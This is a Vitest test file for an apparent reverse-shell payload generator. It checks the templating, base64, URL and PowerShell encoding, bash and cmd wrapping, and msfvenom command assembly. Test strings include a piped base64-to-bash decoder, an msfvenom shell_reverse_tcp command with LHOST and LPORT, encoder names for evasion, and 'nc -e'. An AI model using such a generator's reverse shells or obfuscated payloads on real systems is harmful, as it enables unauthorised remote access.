import { describe, expect, it } from 'vitest'
import { ASM_DEFAULTS, asmFlags, buildPayload, encodersFor, fill, fileName, filterPayloads, language, listenerCommand, msfPayload, parseBadChars } from './generate'
import type { Payload, Tab } from './types'

const p = (name: string, command = 'x', os: Payload['os'] = ['linux'], tags: string[] = []): Payload => ({ name, command, os, tags })
const o: Parameters<typeof buildPayload>[2] = { ip: '1.2.3.4', port: '4444', shell: 'sh', encoding: 'raw', wrap: 'direct', asm: ASM_DEFAULTS }
const sp = { ps: 'x {ip}', psStderr: 'y {ip}' }
const utf16b64 = (s: string) => btoa([...s].map(c => c + '\0').join(''))

describe('fill', () => {
  it('replaces tokens, keeps empty ones and ${name}', () => {
    expect(fill('{ip}:{port} {shell}', { ip: 'a', port: 'b', shell: 'c' })).toBe('a:b c')
    expect(fill('{ip} {port}', { ip: '', port: '1', shell: '' })).toBe('{ip} 1')
    expect(fill('echo ${name} {ip}', { ip: '1', port: '', shell: '' })).toBe('echo ${name} 1')
  })
})

describe('buildPayload', () => {
  const c = p('t', "a 'b' {ip}")
  const build = (x: Partial<typeof o>, pl = c, tab: Tab = 'reverse') => buildPayload(pl, tab, { ...o, ...x }, sp)
  it('wraps', () => {
    expect(build({ wrap: 'bash' })).toBe("bash -c 'a '\\''b'\\'' 1.2.3.4'")
    expect(build({ wrap: 'cmd' })).toBe("cmd /c a 'b' 1.2.3.4")
  })
  it('encodes', () => {
    expect(build({ encoding: 'url' })).toBe('a%20%27b%27%201.2.3.4')
    expect(build({ encoding: 'base64' }, p('t', 'ab'))).toBe('YWI=')
    expect(build({ encoding: 'bashb64' }, p('t', 'ab'))).toBe('echo YWI= | base64 -d | bash')
    expect(build({ encoding: 'psenc' }, p('t', 'ab'))).toBe('powershell -e YQBiAA==')
  })
  it('url-encodes !()*', () => {
    expect(build({ encoding: 'url' }, p('t', '!()*'))).toBe('%21%28%29%2A')
  })
  it('uses special psStderr template', () => {
    expect(build({}, p('PowerShell #2 (Base64)', 'ignored'))).toBe('powershell -e ' + utf16b64('y 1.2.3.4'))
  })
  it('falls back to unwrapped where wrapping does not apply', () => {
    expect(build({ wrap: 'bash' }, p('t', 'a b\nc'))).toBe('a b\nc')
    expect(build({ wrap: 'cmd' }, p('a', 'v {ip}'), 'assembled')).toBe("v 1.2.3.4 -b '\\x00' -f c")
    expect(build({ encoding: 'base64', wrap: 'bash' }, p('m', 'msfvenom -p x LHOST={ip}'), 'msfvenom')).toBe('msfvenom -p x LHOST=1.2.3.4')
    const inner = atob(build({ encoding: 'bashb64', wrap: 'bash' }).split(' ')[1])
    expect(inner).toBe("a 'b' 1.2.3.4")
    const ps = build({ encoding: 'psenc', wrap: 'bash' }).replace('powershell -e ', '')
    expect(atob(ps).replaceAll('\0', '')).toBe("a 'b' 1.2.3.4")
  })
  it('leaves file payloads raw', () => {
    expect(build({ encoding: 'url' }, p('t', 'a b\nc'))).toBe('a b\nc')
  })
  it('uses special ps template', () => {
    expect(build({}, p('PowerShell #1 (Base64)', 'ignored'))).toBe('powershell -e ' + utf16b64('x 1.2.3.4'))
  })
})

describe('language', () => {
  it('classifies by name', () => {
    expect(language(p('PHP exec'))).toBe('PHP')
    expect(language(p('Windows ConPty'))).toBe('PowerShell')
    expect(language(p('Javascript'))).toBe('Other')
    expect(language(p('Java #1'))).toBe('Java')
    expect(language(p('socat #1'))).toBe('nc/ncat')
  })
})

describe('fileName', () => {
  it('uses extension only for reverse files', () => {
    const f = p('PHP PentestMonkey', 'a\nb')
    expect(fileName(f, 'reverse')).toBe('php-pentestmonkey.php')
    expect(fileName(f, 'msfvenom')).toBe('php-pentestmonkey.txt')
    expect(fileName(p('PHP PentestMonkey'), 'reverse')).toBe('php-pentestmonkey.txt')
    expect(fileName(p('C Windows', 'a\nb'), 'reverse')).toBe('c-windows.c')
    expect(fileName(p('C# TCP', 'a\nb'), 'reverse')).toBe('c-tcp.cs')
    expect(fileName(p('Go', 'a\nb'), 'reverse')).toBe('go.go')
    expect(fileName(p('Rust', 'a\nb'), 'reverse')).toBe('rust.rs')
    expect(fileName(p('JSP', 'a\nb'), 'reverse')).toBe('jsp.jsp')
  })
})

describe('msfPayload / listenerCommand', () => {
  it('extracts -p and fills listener', () => {
    expect(msfPayload('msfvenom -p linux/x64/shell_reverse_tcp LHOST=1')).toBe('linux/x64/shell_reverse_tcp')
    expect(listenerCommand('l {ip} {port} {payload}', { ip: '', port: '1', target: '', payload: 'p' })).toBe('l {ip} 1 p')
  })
})

describe('filterPayloads', () => {
  const list = [
    p('Bash one', 'a', ['linux'], ['staged']),
    p('PHP two', 'a\nb', ['linux', 'windows']),
    p('Python three', 'a', ['windows']),
    p('Ruby four', 'a', []),
  ]
  const f: Parameters<typeof filterPayloads>[1] = { text: '', os: 'all', lang: null, tag: null, oneLinersOnly: false }
  const names = (x: Partial<typeof f>) => filterPayloads(list, { ...f, ...x }).map(e => e.name)
  it('narrows', () => {
    expect(names({ text: 'PHP' })).toEqual(['PHP two'])
    expect(names({ os: 'windows' })).toEqual(['PHP two', 'Python three', 'Ruby four'])
    expect(names({ lang: 'Python' })).toEqual(['Python three'])
    expect(names({ tag: 'staged' })).toEqual(['Bash one'])
    expect(names({ oneLinersOnly: true })).toEqual(['Bash one', 'Python three', 'Ruby four'])
  })
})

const x64 = p('L', 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port}', ['linux'], ['x64', 'reverse'])
describe('parseBadChars', () => {
  it.each([['\\x00\\x0a', '\\x00\\x0a'], ['\\x00 \\x0a', '\\x00\\x0a'], ['00 0a', '\\x00\\x0a'], ['000a', '\\x00\\x0a'], ['', '']])('normalises %s', (i, o) => expect(parseBadChars(i)).toBe(o))
  it.each(['\\x0', '00 a', 'zz', '\\x00\\x0'])('rejects %s', (i) => expect(parseBadChars(i)).toBeNull())
})
describe('asmFlags', () => {
  it('defaults', () => expect(asmFlags(x64, ASM_DEFAULTS)).toBe(" -b '\\x00' -f c"))
  it('full set in order', () => expect(asmFlags(x64, { badChars: '00 0a', encoder: 'x64/zutto_dekiru', iterations: 3, nops: 16, format: 'python' })).toBe(" -b '\\x00\\x0a' -e x64/zutto_dekiru -i 3 -n 16 -f python"))
  it('drops a mismatched encoder and its iterations', () => expect(asmFlags(x64, { ...ASM_DEFAULTS, encoder: 'x86/shikata_ga_nai', iterations: 5 })).toBe(" -b '\\x00' -f c"))
  it('omits invalid bad chars', () => expect(asmFlags(x64, { ...ASM_DEFAULTS, badChars: '\\x0' })).toBe(' -f c'))
  it('clamps nops and iterations', () => expect(asmFlags(x64, { ...ASM_DEFAULTS, encoder: 'x64/xor', iterations: 99, nops: 9999 })).toBe(" -b '\\x00' -e x64/xor -i 20 -n 4096 -f c"))
})
it('buildPayload assembled fills text and appends flags', () => expect(buildPayload(x64, 'assembled', o, sp)).toBe("msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -b '\\x00' -f c"))
it('encodersFor filters by arch', () => expect(encodersFor(x64).map(e => e.name)).toEqual(['x64/zutto_dekiru', 'x64/xor_dynamic', 'x64/xor', 'cmd/powershell_base64', 'generic/none']))
it('msfPayload returns empty without -p', () => expect(msfPayload('nc -e')).toBe(''))
it('listenerCommand fills target', () => expect(listenerCommand('h {payload} {target} {port}', { ip: '', port: '4444', target: '10.10.11.5', payload: 'x' })).toBe('h x 10.10.11.5 4444'))
